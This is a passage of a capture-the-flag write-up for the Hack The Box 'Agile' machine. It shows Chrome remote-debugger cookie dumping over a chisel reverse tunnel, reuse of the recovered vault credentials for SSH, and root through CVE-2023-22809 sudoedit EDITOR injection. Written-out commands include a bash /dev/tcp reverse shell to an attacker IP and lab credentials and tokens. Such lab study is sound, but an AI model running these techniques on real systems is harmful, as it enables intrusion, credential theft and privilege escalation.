runner      1083  0.0  0.6  31000 24388 ?        Ss   05:38   0:02 /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5555 wsgi-dev:app
runner      1092  0.0  1.5  79900 62488 ?        S    05:38   0:11  \_ /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5555 wsgi-dev:app
www-data    1084  0.0  0.6  31000 24456 ?        Ss   05:38   0:02 /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5000 --threads=10 --timeout 600 wsgi:app
www-data    1091  0.0  1.6 449400 67584 ?        Sl   05:38   0:09  \_ /app/venv/bin/python3 /app/venv/bin/gunicorn --bind 127.0.0.1:5000 --threads=10 --timeout 600 wsgi:app
corum       8599  0.0  0.2  17052  9448 ?        Ss   09:36   0:00 /lib/systemd/systemd --user
corum       8600  0.0  0.0 103440  3524 ?        S    09:36   0:00  \_ (sd-pam)
corum      15815  0.0  0.0  78824  2924 ?        SLs  09:39   0:00  \_ /usr/bin/gpg-agent --supervised
runner      8757  0.0  0.0 33575872 1640 ?       Sl   09:38   0:00 /opt/google/chrome/chrome_crashpad_handler --monitor-self-annotation=ptype=crashpad-handler --database=/tmp --url=https://clients2.google.com/cr/report --annotation=channel= --annotation=lsb-release=Ubuntu 22.04.2 LTS --annotation=pl
corum@agile:/app$ 
```

Can we read the `test_and_update.sh` script that appears to be running via cron above?:

```bash
corum@agile:/app$ cat test_and_update.sh 
#!/bin/bash

# update prod with latest from testing constantly assuming tests are passing

echo "Starting test_and_update"
date

# if already running, exit
ps auxww | grep -v "grep" | grep -q "pytest" && exit

echo "Not already running. Starting..."

# start in dev folder
cd /app/app-testing

# system-wide source doesn't seem to happen in cron jobs
source /app/venv/bin/activate

# run tests, exit if failure
pytest -x 2>&1 >/dev/null || exit

# tests good, update prod (flask debug mode will load it instantly)
cp -r superpass /app/app/
echo "Complete!"
```

So, we print out *"Starting test_and _update*", print a timestamp.  If `pytest` is already running (and `ps` above shows it is) then exit.

Otherwise, we `cd` into `/app/app-testing`, we `source /app/venv/bin/activate`, then run `pytest -x` before recursively copying the `superpass/` directory into `/app/app`

We can do this manually:

```bash
corum@agile:~$ cd /app/app-testing
corum@agile:/app/app-testing$ source /app/venv/bin/activate
(venv) corum@agile:/app/app-testing$ pytest -x
====================================================================== test session starts =======================================================================
platform linux -- Python 3.10.6, pytest-7.2.0, pluggy-1.0.0
rootdir: /app/app-testing
collected 0 items / 1 error                                                                                                                                      

============================================================================= ERRORS =============================================================================
__________________________________________________ ERROR collecting tests/functional/test_site_interactively.py __________________________________________________
tests/functional/test_site_interactively.py:10: in <module>
    with open('/app/app-testing/tests/functional/creds.txt', 'r') as f:
E   PermissionError: [Errno 13] Permission denied: '/app/app-testing/tests/functional/creds.txt'
======================================================================== warnings summary ========================================================================
../venv/lib/python3.10/site-packages/_pytest/cacheprovider.py:433
  /app/venv/lib/python3.10/site-packages/_pytest/cacheprovider.py:433: PytestCacheWarning: cache could not write path /app/app-testing/.pytest_cache/v/cache/nodeids
    config.cache.set("cache/nodeids", sorted(self.cached_nodeids))

../venv/lib/python3.10/site-packages/_pytest/cacheprovider.py:387
  /app/venv/lib/python3.10/site-packages/_pytest/cacheprovider.py:387: PytestCacheWarning: cache could not write path /app/app-testing/.pytest_cache/v/cache/lastfailed
    config.cache.set("cache/lastfailed", self.lastfailed)

../venv/lib/python3.10/site-packages/_pytest/stepwise.py:52
  /app/venv/lib/python3.10/site-packages/_pytest/stepwise.py:52: PytestCacheWarning: cache could not write path /app/app-testing/.pytest_cache/v/cache/stepwise
    session.config.cache.set(STEPWISE_CACHE_DIR, [])

-- Docs: https://docs.pytest.org/en/stable/how-to/capture-warnings.html
==================================================================== short test summary info =====================================================================
ERROR tests/functional/test_site_interactively.py - PermissionError: [Errno 13] Permission denied: '/app/app-testing/tests/functional/creds.txt'
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! stopping after 1 failures !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!! Interrupted: 1 error during collection !!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!
================================================================== 3 warnings, 1 error in 0.27s ==================================================================
```

We see the following in `/app/app-testing/tests/functional`:

```bash
(venv) corum@agile:/app/app-testing$ ls -la tests/functional/
total 20
drwxr-xr-x 3 runner    runner 4096 Feb  7 13:12 .
drwxr-xr-x 3 runner    runner 4096 Feb  6 18:10 ..
drwxrwxr-x 2 runner    runner 4096 Mar 23 10:00 __pycache__
-rw-r----- 1 dev_admin runner   34 Mar 23 10:03 creds.txt
-rw-r--r-- 1 runner    runner 2663 Mar 23 10:03 test_site_interactively.py
```

Only `test_site_interactively.py` is readable:

```python
(venv) corum@agile:/app/app-testing$ cat tests/functional/test_site_interactively.py 
import os
import pytest
import time
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait


with open('/app/app-testing/tests/functional/creds.txt', 'r') as f:
    username, password = f.read().strip().split(':')


@pytest.fixture(scope="session")
def driver():
    options = Options()
    #options.add_argument("--no-sandbox")
    options.add_argument("--window-size=1420,1080")
    options.add_argument("--headless")
    options.add_argument("--remote-debugging-port=41829")
    options.add_argument('--disable-gpu')
    options.add_argument('--crash-dumps-dir=/tmp')
    driver = webdriver.Chrome(options=options)
    yield driver
    driver.close()


def test_login(driver):
    print("starting test_login")
    driver.get('http://test.superpass.htb/account/login')
    time.sleep(1)
    username_input = driver.find_element(By.NAME, "username")
    username_input.send_keys(username)
    password_input = driver.find_element(By.NAME, "password")
    password_input.send_keys(password)
    driver.find_element(By.NAME, "submit").click()
    time.sleep(3)
    title = driver.find_element(By.TAG_NAME, "h1")
    assert title.text == "Welcome to your vault"


def test_add_password(driver):
    print("starting test_add_password")
    driver.find_element(By.NAME, "add_password").click()
    time.sleep(3)
    site = driver.find_element(By.NAME, "url")
    site.send_keys("test_site")
    username = driver.find_element(By.NAME, "username")
    username.send_keys("test_user")
    driver.find_element(By.CLASS_NAME, "fa-save").click()
    time.sleep(3)

    assert 'test_site' in driver.page_source
    assert 'test_user' in driver.page_source


def test_del_password(driver):
    print("starting test_del_password")
    password_rows = driver.find_elements(By.CLASS_NAME, "password-row")

    for row in password_rows:
        if "test_site" == row.find_elements(By.TAG_NAME, "td")[1].text and \
            "test_user" == row.find_elements(By.TAG_NAME, "td")[2].text:
            row.find_element(By.CLASS_NAME, "fa-trash").click()

    time.sleep(3)
    assert 'test_site' not in driver.page_source
    assert 'test_user' not in driver.page_source


def test_title(driver):
    print("starting test_title")
    driver.get('http://test.superpass.htb')
    time.sleep(3)
    assert "SuperPassword 𥦸" == driver.title


def test_long_running(driver):
    print("starting test_long_running")
    driver.get('http://test.superpass.htb')
    time.sleep(550)
    #time.sleep(5)
    assert "SuperPasword 𥦸" == driver.title
```

Our Python script above looks to be running some tests with Selenium using headless Chrome.  It reads credentials from `/app/app-testing/tests/functional/creds.txt` into username and password.

The test suite authenticates by using the Selenium web driver to browse to http://test.superpass.htb/account/login, finds the username and password elements on the page, enters key presses using the credentials from `/app/app-testing/tests/functional/creds.txt`, clicks the submit button, then confirms *"Welcome to your vault"* shows in a h1 heading.

Similarly, other tests exist to confirm a password can be added to the password vault app and removed by interacting with the app, and asserting on whether or not elements exist on the page.

Circling back around to our `test_and_update.sh`, basically if the tests pass, it will then deploy the superpass directory from `/app/app-testing` into the production folder `/app/app` by doing a recursive copy with `cp -r`

I looked at `/app/venv/bin/activate`, which adds `/app/venv/bin` to the beginning of `$PATH` to see if I could write to and change the virtual env to overwrite executables such as `pytest` to run a shell, but no luck.

The above test script opens Chromes remote debugger on port 41829, which we can also see in the output.  Seeing as though our test suite above logs in with valid credentials in the test environment, I started looking around to see if we could dump/steal cookies via  the remote debugger.

This article https://embracethered.com/blog/posts/2020/chrome-spy-remote-control/  outlines connecting to the remote debugger.  I uploaded [chisel](https://github.com/jpillora/chisel) to our target, which allows us to tunnel TCP connections over HTTP.

First, I ran a chisel server (reverse) locally on my Parrot VM on port 8000:

```bash
zara$./chisel server -p 8000 --reverse
2023/03/23 21:44:15 server: Reverse tunnelling enabled
2023/03/23 21:44:15 server: Fingerprint RKgTWkEcy/7fipXRcrsd8C1ZXHPjm4hp6Jmgi4P827E=
2023/03/23 21:44:15 server: Listening on http://0.0.0.0:8000 
```

Next, I downloaded chisel to the target from my own machine's HTTP server.  We run with `10.10.14.8:8000` , to connect **out** to my machine.  `R:4444:127.00.1:41829` is allowing our client (the target) to define a reverse tunnel (we specified `--reverse` flag on the server above) such that if I connect to port 4444 on my own machine, a reverse tunnel back to the client/target will be opened and forwarded to the chrome remote debugger on 41829:

```bash
corum@agile:/dev/shm$ curl -o chisel http://10.10.14.8:8081/chisel
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 8188k  100 8188k    0     0  2007k      0  0:00:04  0:00:04 --:--:-- 2007k
corum@agile:/dev/shm$ chmod +x chisel
corum@agile:/dev/shm$ ./chisel client 10.10.14.8:8000 R:4444:127.0.0.1:41829
```

Initially I tried browsing to http://localhost:4444/ in Chromium, but was getting a blank page and not sure on the correct URL.   I next encountered a great article demonstrating cookie dumping via the remote debugger: [Hands in the Cookie Jar: Dumping Cookies with Chromium's Remote Debugger Port](https://posts.specterops.io/hands-in-the-cookie-jar-dumping-cookies-with-chromiums-remote-debugger-port-34c4f468844e)

Preferring to do things the manual way, we enumerate the `/json` endpoint, which gives us the web socket address for the remote debugger:

```bash
$curl http://127.0.0.1:4444/json                                          
[ {
   "description": "",
   "devtoolsFrontendUrl": "/devtools/inspector.html?ws=127.0.0.1:4444/devtools/page/F5C885E8C47B8DABE5F40413343D1DA7",
   "id": "F5C885E8C47B8DABE5F40413343D1DA7",
   "title": "SuperPassword 𥦸",
   "type": "page",
   "url": "http://test.superpass.htb/",
   "webSocketDebuggerUrl": "ws://127.0.0.1:4444/devtools/page/F5C885E8C47B8DABE5F40413343D1DA7"
} ]
```

Next, connect to the web socket, and issue the `Network.getAllCookies` API command, which, you guessed it, dumps the headless brower's cookies:

```bash
$wsdump ws://127.0.0.1:4444/devtools/page/F5C885E8C47B8DABE5F40413343D1DA7
Press Ctrl+C to quit
> {"id": 1, "method": "Network.getAllCookies"}

< {"id":1,"result":{"cookies":[{"name":"remember_token","value":"1|7fdd6de822618430df3a639745265d1843029b204f9785856ac1b107d54cb0948f2d43b52093bdf700bf9e6932003f2a6603445fddd88a352824cc21c7b874d4","domain":"test.superpass.htb","path":"/","expires":1711140905.844064,"size":144,"httpOnly":true,"secure":false,"session":false,"priority":"Medium","sameParty":false,"sourceScheme":"NonSecure","sourcePort":80},{"name":"session","value":".eJwlzjkOwjAQAMC_uKbYy2snn0HeS9AmpEL8HSTmBfNu9zryfLT9dVx5a_dntL1x6FxEI2cX1lATrF6KSgYjJDcv24LSRQu2bqQwPXGymkPMEIMAjpDRO6DjcqqZqoOjWBxRQYEsmXHgxCUhsNzTRhh2kvaLXGce_w22zxef3y7n.ZBy8qQ.FDBjE0KMsHAElWcFQXZ_bku66-I","domain":"test.superpass.htb","path":"/","expires":-1,"size":215,"httpOnly":true,"secure":false,"session":true,"priority":"Medium","sameParty":false,"sourceScheme":"NonSecure","sourcePort":80}]}}
```

We can also just browse to the `devtoolsFrontendUrl` above, and we're effectively looking at the selenium test session, with access to the password vault for the test user:

![](assets/2023-03-24-08-14-21-image.png)

So, we have two sets of credentials - `edwards` / `d07867c6267dcb5df0af` and `dedwards__` / `7dbfe676b6b564ce5718`

Trying the first set of credentials grants us SSH access:

```bash
$sshpass -p 'd07867c6267dcb5df0af' ssh edwards@superpass.htb
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-60-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

This system has been minimized by removing packages and content that are
not required on a system that users do not log into.

To restore this content, you can run the 'unminimize' command.
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.

Last login: Thu Mar  2 10:28:51 2023 from 10.10.14.23
edwards@agile:~$ 
```

Checking sudo access, we see we can run `sudoedit` on two files as the dev_admin user:

```bash
edwards@agile:~$ sudo -l
Matching Defaults entries for edwards on agile:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User edwards may run the following commands on agile:
    (dev_admin : dev_admin) sudoedit /app/config_test.json
    (dev_admin : dev_admin) sudoedit /app/app-testing/tests/functional/creds.txt
```

We find a database connection string with credentials when running `sudoedit -u dev_admin /app/config_test.json`:

```json
{
        "SQL_URI": "mysql+pymysql://superpasstester:VUO8A2c2#3FnLq3*a9DX1U@localhost/superpasstest"
}
```

Running `sudoedit -u dev_admin /app/app-testing/tests/functional/creds.txt`:

```
edwards:1d7ffjwrx#$d6qn!9nndqgde4
```

It was here I started to go down rabbit holes, looking as SetUID binaries (wondering if I could exploit `chrome-sandbox`..), running LinPEAS again, looking for world-writeable files, grepping the filesystem for passwords stored in clear text, etc.

I then search for *"sudoedit arbitrary file"*, wondering if I could change my `sudo`ers permission to edit **any** arbitrary file, not just `/app/config_test.json` and `/app/app-testing/tests/functional/creds.txt`.  I came across [CVE-2023-22809](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2023-22809) here  [Sudoedit can edit arbitrary files | Sudo](https://www.sudo.ws/security/advisories/sudoedit_any/), which affects up to sudo version 1.9.12p1 -- a fairly new CVE!:

```bash
edwards@agile:/dev/shm$ sudo --version
Sudo version 1.9.9
Sudoers policy plugin version 1.9.9
Sudoers file grammar version 48
Sudoers I/O plugin version 1.9.9
Sudoers audit plugin version 1.9.9
edwards@agile:/dev/shm$ 
```

Our target should be vulnerable.

How does this vulnerability work?  Essentially, when we run `sudoedit /app/config_test.json`, the `EDITOR` environment variable is used by the policy module to choose an editor for the file.  The sudoers module constructs a new argument consisting of the selected editor, which may contain multiple arguments.

Why is this a problem?  We can  add `--` to our `EDITOR`, which in bash signifies the end of command options. We already know our cron job that runs `test_and_update.sh` will source `/app/venv/bin/activate`.  This file is executed in the current shell context to setup our `PATH` for running python binaries (`pytest`, in this instance). Can we modify this file and add arbitrary code?:

```bash
edwards@agile:/app/venv/bin$ ls -al activate
-rw-rw-r-- 1 root dev_admin 1976 Mar 24 09:30 activate
```

We can see the `activate` script is owned by root and group dev_admin -- the user who we are able to assume privileges as for modifying two particularly files.  Back to setting `EDITOR` -- let's try terminating the command options with `--` within this variable, and running sudoedit:

```bash
EDITOR="vim -- /app/venv/bin/activate" sudoedit -u dev_admin /app/config_test.json
```

Here we're specifying our editor as vim, which will be used as a prefix for the file we are able to edit.. **but**, we're specifying the end of command line flags with `--`, so effectively `/app/venv/bin/activate` will be our first *file* argument.  As a result, we can edit it.

Running the above opened vim with the contents of this file.  I quickly ran `nc -lvnp 3322` on my own machine to establish a netcat listener on TCP port 3322.  At the bottom of the file, I added the following reverse shell:

```bash
bash -i >& /dev/tcp/10.10.14.8/3322 0>&1
```

Then, `:wq` (I think I remember how to quit vim?..).  Running `cat /app/venv/bin/activate` showed my little reverse shell had been persisted to the file (sudoedit writes to a temp file first, then overwrites the original file), so things look promising.

Now we wait, and after a little patience our cron job kicks off, `source`s our modified file which establishes a reverse shell running as root:

```bash
$nc -lvnp 3322
Listening on 0.0.0.0 3322
Connection received on 10.10.11.203 54960
bash: cannot set terminal process group (36640): Inappropriate ioctl for device
bash: no job control in this shell
root@agile:~# ls -la
ls -la
total 76
drwx------  8 root root  4096 Mar  8 15:30 .
drwxr-xr-x 20 root root  4096 Feb 20 23:29 ..
lrwxrwxrwx  1 root root     9 Feb  6 16:56 .bash_history -> /dev/null
-rw-r--r--  1 root root  3106 Dec  1 19:00 .bashrc
drwx------  4 root root  4096 Feb  8 16:29 .cache
drwx------  3 root root  4096 Feb  8 16:29 .config
drwxr-xr-x  3 root root  4096 Feb  8 16:29 .local
-rw-------  1 root root    53 Feb  6 17:14 .my.cnf
drwx------  3 root root  4096 Feb  8 16:29 .pki
-rw-r--r--  1 root root   161 Dec 13 17:59 .profile
drwx------  2 root root  4096 Feb  8 16:29 .ssh
-rw-------  1 root root 14823 Mar  8 15:30 .viminfo
drwxr-xr-x  5 root root  4096 Feb  8 16:29 app
-rwxr-xr-x  1 root root    31 Jan 25 21:02 clean.sh
-rw-r-----  1 root root    33 Mar 24 05:38 root.txt
-rw-r--r--  1 root root  2293 Feb 28 16:50 superpass.sql
-rw-r--r--  1 root root  3274 Feb  6 17:06 testdb.sql
root@agile:~# cat root.txt
cat root.txt
d4a76f6af6ec1bd2249a128031538b41
```

We have the root flag!  And with that, we're done!

## Conclusion

A super cool machine.  LFI was nothing new or unexpected, but exploiting two different remote buggers - Werkzeug, which required a little detective work, and the Chrome remote debugger -- were both new attack vectors I've not encountered until now.  The `sudoedit` vulnerability where we set the `EDITOR` was also new to me, and it's awesome when machines include quite new CVEs like this in a real worldish setting.  Super fun machine overall.
